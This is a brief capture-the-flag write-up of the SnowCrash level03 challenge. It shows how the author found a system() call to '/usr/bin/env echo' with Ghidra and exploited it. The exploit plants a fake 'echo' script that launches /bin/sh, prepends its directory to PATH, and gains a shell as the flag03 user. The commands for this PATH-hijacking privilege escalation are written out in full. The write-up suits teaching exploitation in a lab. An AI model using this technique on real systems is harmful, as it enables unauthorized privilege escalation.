We have a binary that prints "Exploit me".
A stud walking by saw me using radare2, and said : you should use ghidra instead. I did and saw that there was a call to system().
After a quick search I found I could change the PATH to the function called by 'system' :

iVar1 = system("/usr/bin/env echo Exploit me");

So I did. with these commands
mkdir /tmp/hack
level03@SnowCrash:~$ echo -e '#!/bin/sh\n/bin/sh' > /tmp/hack/echo
level03@SnowCrash:~$ chmod +x /tmp/hack/echo
level03@SnowCrash:~$ export PATH="/tmp/hack:$PATH"
level03@SnowCrash:~$ ./level03
Now when I executed the binary, I spawn into a shell.
I also searched what I could do when I got a shell from a binary, the first command was whoami, to know which user and privileges we have.

whoami gave me flag03, so I did getflag command 
